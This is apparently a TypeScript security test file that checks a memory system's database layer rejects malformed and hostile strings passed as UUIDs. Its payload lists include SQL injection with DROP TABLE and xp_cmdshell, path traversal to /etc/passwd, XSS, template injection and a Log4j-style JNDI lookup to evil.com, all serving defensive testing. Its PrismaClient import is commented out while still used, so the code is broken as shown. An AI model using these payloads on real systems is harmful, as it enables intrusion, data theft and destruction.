/**
 * Cortex MCP System - UUID Validation Security Tests
 *
 * Specific tests for UUID validation vulnerabilities and edge cases
 * that were identified in previous testing phases.
 *
 * @version 1.0.0
 */

import { describe, test, expect, beforeAll, afterAll } from 'vitest';
// PrismaClient removed - system now uses Qdrant + PostgreSQL architecture';
import { randomUUID } from 'crypto';

describe('UUID Validation Security Tests', () => {
  let prisma: PrismaClient;
  let testEntityId: string;
  let testProjectId: string;

  beforeAll(async () => {
    prisma = new PrismaClient();
    testEntityId = randomUUID();
    testProjectId = 'uuid-security-test';
  });

  afterAll(async () => {
    // Cleanup test data
    await prisma.observation.deleteMany({
      where: { project: testProjectId, created_by: 'uuid-security-test' }
    });
    await prisma.relation.deleteMany({
      where: { project: testProjectId, created_by: 'uuid-security-test' }
    });
    await prisma.entity.deleteMany({
      where: { project: testProjectId, created_by: 'uuid-security-test' }
    });
    await prisma.$disconnect();
  });

  describe('Invalid UUID Format Detection', () => {
    test('should reject malformed UUIDs in entity references', async () => {
      const maliciousUUIDs = [
        'not-a-uuid',
        '123-456-789',
        '00000000-0000-0000-0000-00000000000', // Too short
        '00000000-0000-0000-0000-0000000000000', // Too long
        'gggggggg-gggg-gggg-gggg-gggggggggggg', // Invalid hex characters
        '00000000-0000-0000-0000-00000000000', // Missing character
        '0000000-0000-0000-0000-000000000000', // Missing character
        '00000000-0000-0000-000-000000000000', // Missing character
        '00000000-0000-0000-0000-00000000000', // Missing character
        'ZZZZZZZZ-ZZZZ-ZZZZ-ZZZZ-ZZZZZZZZZZZZ', // Invalid characters
        '00000000-0000-0000-0000-000000000000-', // Trailing dash
        '-00000000-0000-0000-0000-000000000000', // Leading dash
        '00000000_0000_0000_0000_000000000000', // Underscores instead of dashes
        '00000000000000000000000000000000', // No dashes
        ' 00000000-0000-0000-0000-000000000000', // Leading space
        '00000000-0000-0000-0000-000000000000 ', // Trailing space
        '00000000-0000-0000-0000-000000000000\n', // Newline
        '00000000-0000-0000-0000-000000000000\t', // Tab
        '../../etc/passwd', // Path traversal
        '..\\..\\windows\\system32\\config\\sam', // Windows path traversal
        '<script>alert("xss")</script>', // XSS attempt
        "'; DROP TABLE entity; --", // SQL injection
        '${jndi:ldap://evil.com/a}', // Log4j style injection
        '{{7*7}}', // Template injection
        '{{config}}', // Template injection
        '{{constructor.constructor("alert(1)")()}}', // Sandboxed template injection
        '../../../proc/version', // Linux file path
        'C:\\Windows\\System32\\drivers\\etc\\hosts', // Windows file path
        'file:///etc/passwd', // File URI
        'http://evil.com/malicious', // URL injection
        'data:text/html,<script>alert(1)</script>', // Data URI
        'javascript:alert(1)', // JavaScript URI
        'vbscript:msgbox(1)', // VBScript URI
        'mailto:test@example.com', // Mailto URI
        'ftp://evil.com/', // FTP URI
        'ldap://evil.com/', // LDAP URI
      ];

      // Create a test entity to reference
      const entity = await prisma.entity.create({
        data: {
          id: testEntityId,
          name: 'UUID Test Entity',
          type: 'test',
          project: testProjectId,
          created_by: 'uuid-security-test'
        }
      });

      for (const maliciousUUID of maliciousUUIDs) {
        // Test observation creation with invalid entity_id
        await expect(
          prisma.observation.create({
            data: {
              entity_id: maliciousUUID,
              fact: 'Test observation',
              project: testProjectId,
              created_by: 'uuid-security-test'
            }
          })
        ).rejects.toThrow();

        // Test relation creation with invalid source/target entity_id
        await expect(
          prisma.relation.create({
            data: {
              source_entity_id: maliciousUUID,
              target_entity_id: testEntityId,
              relation_type: 'test',
              project: testProjectId,
              created_by: 'uuid-security-test'
            }
          })
        ).rejects.toThrow();

        await expect(
          prisma.relation.create({
            data: {
              source_entity_id: testEntityId,
              target_entity_id: maliciousUUID,
              relation_type: 'test',
              project: testProjectId,
              created_by: 'uuid-security-test'
            }
          })
        ).rejects.toThrow();
      }

      // Cleanup
      await prisma.entity.delete({
        where: { id: testEntityId }
      });
    });

    test('should handle null and undefined UUID values', async () => {
      // Test with null UUID
      await expect(
        prisma.observation.create({
          data: {
            entity_id: null as any,
            fact: 'Test observation',
            project: testProjectId,
            created_by: 'uuid-security-test'
          }
        })
      ).rejects.toThrow();

      // Test with undefined UUID
      await expect(
        prisma.observation.create({
          data: {
            entity_id: undefined as any,
            fact: 'Test observation',
            project: testProjectId,
            created_by: 'uuid-security-test'
          }
        })
      ).rejects.toThrow();
    });

    test('should validate UUID format in database operations', async () => {
      // Create valid test data
      const entity1 = await prisma.entity.create({
        data: {
          name: 'Entity 1',
          type: 'test',
          project: testProjectId,
          created_by: 'uuid-security-test'
        }
      });

      const entity2 = await prisma.entity.create({
        data: {
          name: 'Entity 2',
          type: 'test',
          project: testProjectId,
          created_by: 'uuid-security-test'
        }
      });

      // Test valid operations
      const observation = await prisma.observation.create({
        data: {
          entity_id: entity1.id,
          fact: 'Valid observation',
          project: testProjectId,
          created_by: 'uuid-security-test'
        }
      });

      const relation = await prisma.relation.create({
        data: {
          source_entity_id: entity1.id,
          target_entity_id: entity2.id,
          relation_type: 'test',
          project: testProjectId,
          created_by: 'uuid-security-test'
        }
      });

      expect(observation.entity_id).toBe(entity1.id);
      expect(relation.source_entity_id).toBe(entity1.id);
      expect(relation.target_entity_id).toBe(entity2.id);

      // Cleanup
      await prisma.observation.delete({
        where: { id: observation.id }
      });
      await prisma.relation.delete({
        where: { id: relation.id }
      });
      await prisma.entity.deleteMany({
        where: {
          id: { in: [entity1.id, entity2.id] }
        }
      });
    });
  });

  describe('UUID Edge Cases', () => {
    test('should handle special UUID values', async () => {
      const specialUUIDs = [
        '00000000-0000-0000-0000-000000000000', // Nil UUID
        'ffffffff-ffff-ffff-ffff-ffffffffffff', // Max UUID
        '123e4567-e89b-12d3-a456-426614174000', // Example from RFC 4122
        '6ba7b810-9dad-11d1-80b4-00c04fd430c8', // Name-based MD5 UUID
        '6ba7b811-9dad-11d1-80b4-00c04fd430c8', // Name-based MD5 UUID
        '6ba7b812-9dad-11d1-80b4-00c04fd430c8', // Name-based MD5 UUID
      ];

      // Create test entity
      const entity = await prisma.entity.create({
        data: {
          name: 'Special UUID Test Entity',
          type: 'test',
          project: testProjectId,
          created_by: 'uuid-security-test'
        }
      });

      for (const specialUUID of specialUUIDs) {
        // These should be valid UUIDs but may not exist in the database
        await expect(
          prisma.observation.create({
            data: {
              entity_id: specialUUID,
              fact: 'Test with special UUID',
              project: testProjectId,
              created_by: 'uuid-security-test'
            }
          })
        ).rejects.toThrow(); // Should fail because entity doesn't exist, not because UUID is invalid
      }

      // Test with actual entity ID (should work)
      const validObservation = await prisma.observation.create({
        data: {
          entity_id: entity.id,
          fact: 'Valid observation',
          project: testProjectId,
          created_by: 'uuid-security-test'
        }
      });

      expect(validObservation.entity_id).toBe(entity.id);

      // Cleanup
      await prisma.observation.delete({
        where: { id: validObservation.id }
      });
      await prisma.entity.delete({
        where: { id: entity.id }
      });
    });

    test('should handle UUID case sensitivity correctly', async () => {
      const entity = await prisma.entity.create({
        data: {
          name: 'Case Sensitivity Test',
          type: 'test',
          project: testProjectId,
          created_by: 'uuid-security-test'
        }
      });

      const lowercaseId = entity.id.toLowerCase();
      const uppercaseId = entity.id.toUpperCase();

      // UUIDs should be case-insensitive in PostgreSQL
      // Both should work
      const obs1 = await prisma.observation.create({
        data: {
          entity_id: lowercaseId,
          fact: 'Lowercase UUID test',
          project: testProjectId,
          created_by: 'uuid-security-test'
        }
      });

      const obs2 = await prisma.observation.create({
        data: {
          entity_id: uppercaseId,
          fact: 'Uppercase UUID test',
          project: testProjectId,
          created_by: 'uuid-security-test'
        }
      });

      expect(obs1.entity_id.toLowerCase()).toBe(entity.id.toLowerCase());
      expect(obs2.entity_id.toLowerCase()).toBe(entity.id.toLowerCase());

      // Cleanup
      await prisma.observation.deleteMany({
        where: {
          id: { in: [obs1.id, obs2.id] }
        }
      });
      await prisma.entity.delete({
        where: { id: entity.id }
      });
    });
  });

  describe('UUID Security in Search Operations', () => {
    test('should prevent UUID injection in search queries', async () => {
      const maliciousUUIDSearches = [
        "'; DROP TABLE entity; --",
        "' OR '1'='1",
        "' UNION SELECT id, name FROM entity --",
        "' AND (SELECT COUNT(*) FROM entity) > 0 --",
        "' WAITFOR DELAY '00:00:05' --",
        "' EXEC xp_cmdshell('dir') --",
        "00000000-0000-0000-0000-000000000000' OR 'x'='x",
        "12345678-1234-1234-1234-123456789012' UNION SELECT * FROM entity --"
      ];

      const entity = await prisma.entity.create({
        data: {
          name: 'Search Test Entity',
          type: 'test',
          project: testProjectId,
          created_by: 'uuid-security-test'
        }
      });

      for (const maliciousUUID of maliciousUUIDSearches) {
        // These should not cause SQL errors
        const results = await prisma.observation.findMany({
          where: {
            entity_id: maliciousUUID
          }
        });

        // Should return empty results, not cause errors
        expect(Array.isArray(results)).toBe(true);
      }

      // Cleanup
      await prisma.entity.delete({
        where: { id: entity.id }
      });
    });
  });
});